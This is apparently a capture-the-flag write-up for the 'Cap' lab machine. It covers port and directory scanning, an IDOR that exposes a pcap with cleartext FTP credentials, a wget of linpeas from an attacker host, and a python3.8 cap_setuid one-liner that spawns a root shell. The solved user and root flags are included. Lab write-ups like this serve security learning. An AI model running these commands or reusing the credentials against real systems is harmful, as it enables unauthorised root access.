# Cap - Easy

```shell
rustscan -a 10.10.10.245 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.10.10.245 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

ftp 10.10.10.245
#get user flag

ssh 10.10.10.245
#reuse creds

cd /tmp

#get linpeas.sh from server on attacker machine
wget http://10.10.14.7:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#to exploit python capabilities setuid
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
#we get root shell
```

```markdown
Open ports & services:

  * 21 - ftp - vsftpd 3.0.3
  * 22 - ssh - OpenSSH 8.2p1 (Ubuntu)
  * 80 - http - gunicorn

The webpage shows a dashboard for security events; it also has links to /capture, /ip and /netstat.

The enumerated directories include /static and /data; we can check these as well.

Now, /ip and /netstat seem to be the output of the commands with the same name.

/capture leads to /data/1; we can try changing the '1' in the URL to different numbers.

When it is changed to /data/0, we can see that it has more numbers; we also have the option to download it as .pcap, so we do that.

This is a clear indicator of IDOR (Insecure Direct Object References) vulnerability.

Now, if we go through the .pcap file, in the FTP protocol, we can see the creds nathan:Buck3tH4TF0RM3! in cleartext.

Using these creds to log into FTP, we can get user flag.

We can also reuse these creds to log into SSH as nathan.

To check for privesc, we can use linpeas.sh

linpeas shows us that python3.8 is set with capabilities such as cap_setuid, and that can be misused.

With the help of GTFObins, we can exploit the capabilites set in Python and get root shell.
```

1. User flag - 301aaa425a39294a4f6da0d8203d3531

2. Root flag - 624831fda3fea026fc6d6768e5a14f00
